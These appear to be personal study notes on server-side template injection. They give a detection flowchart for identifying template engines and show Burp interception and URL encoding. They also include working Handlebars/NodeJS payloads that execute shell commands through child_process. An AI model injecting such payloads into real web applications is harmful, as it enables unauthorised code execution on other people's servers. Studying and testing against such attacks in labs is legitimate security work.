# SSTIs - Server-side template injection
﷽
* Basically, SSTIs happen because websites use templates. The variables passed through to these templates may be un-sanitised and therefore, we can run our own malicious code on machines.
## Detection
# Template Injection Detection Flow (+ve/-ve)

Start with `${7*7}` or `{{7*7}}` and follow the result-based paths.

                            +-----------+
                            | ${7*7}    |  (+ve)
                            +-----------+
                             /         \
                            /           \
                           /             \
                          v               v
                +----------------+   +----------------+
                | a{*comment*}b  |   | {{7*7}}        |
                |     (+ve)      |   |     (-ve)      |
                +----------------+   +----------------+
                        |                   |
             +----------+          +--------+--------+
             |                     |                 |
             v                     v                 v
       +------------+       +----------------+   +----------------+
       | Smarty     |       | {{7*'7'}}      |   | Not vulnerable |
       |  (+ve)     |       |    (+ve)       |   |     (-ve)      |
       +------------+       +----------------+   +----------------+
                                 /       \
                                /         \
                               v           v
                        +-----------+ +-----------+
                        | Jinja2    | | Twig      |
                        |  (+ve)    | |  (+ve)    |
                        +-----------+ +-----------+

From a{*comment*}b path:
    |
    v
+------------------------+
| ${"z".join("ab")}      |  (-ve)
+------------------------+
         |
     +---+---+
     |       |
     v       v
 +--------+ +---------+
 | Mako   | | Unknown |
 | (+ve)  | | (-ve)   |
 +--------+ +---------+

* This flowchart can be used to determine the template that is used.

## Exploitation

* Using BurpSuite FoxyProxy, we can intercept a `POST` request and modify it to include a custom malicious payload (In my case rn, a RCE.)
  * Note, use `CMD + R ` to send packets.

### Payloads

* This [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#handlebars-nodejsl) article shows different templates' and their exploits.

* For example, in the case of Handlebars (**NodeJS**),
  * Focus on the line `{{this.push "return require('child_process').exec('whoami');"}}`, which instructs the server to run the command `whoami`

### URL Encoding

* In a URL, most characters aren't allowed to be used. We can only send characters from the 128 ASCII Character set.
* Reserved characters that don't belong in this set must be encoded.
* For example, `&` becomes `%26`

##### ***How to encode:***
  * Paste the payload into the "`Decoder`" tab of Burp and select `Encode as` > `URL`.

* Copy the URL-encoded payload and paste it into a SSTI-vulnerable field; in my case the `email` field.

### Troubleshooting (specific to NodeJS)

```
{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return process;"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}
```

* That's it fixed as `require()` isn't global defined and doesn't work lol

Nvm:
{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return
process.mainModule.require('child_process').execSync('whoami');"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}


there we go

